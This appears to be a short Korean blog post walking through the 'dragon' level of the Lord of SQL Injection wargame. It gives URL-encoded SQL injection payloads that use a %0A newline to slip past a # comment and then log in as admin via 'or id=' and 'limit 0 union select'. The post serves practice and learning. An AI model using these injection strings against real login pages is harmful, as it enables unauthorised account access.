---
layout: post
title: LOS Dragon
date: 2015-08-16 23:05:00 +0900
category: Hacking 
---
```
http://leaveret.kr/los/dragon_51996aa769df79afbf79eb4d66dbcef6.php?pw=%27%0A%20or%20id=%27admin%27%23
```



정확히는 기억안나지만 #은 한줄을 주석처리하는 것이다

이떄 중간에 %0A 개행문자를 넣어서 주석처리를 우회하는 문제로 기억한다. 

url이 달라서 안맞지만 PayLoad는 저거 아마도?



최근 다시 풀어보니 쿼리가 안먹힌다... 뭐지?



```
http://los.sandbox.cash/chall/dragon_c1577dc8b003a4f163cab14e8d92510b.php?pw=%0Alimit%200%20union%20select%20%27admin
```

일단 %0a를 이용해 개행문자를 넣어주는 것은 맞다 

```
%0Alimit 0 union select 'admin
```


limit 0 해서 결과값이 없게 한다음 ```union select 'admin``` 을 넣어주면 된다.






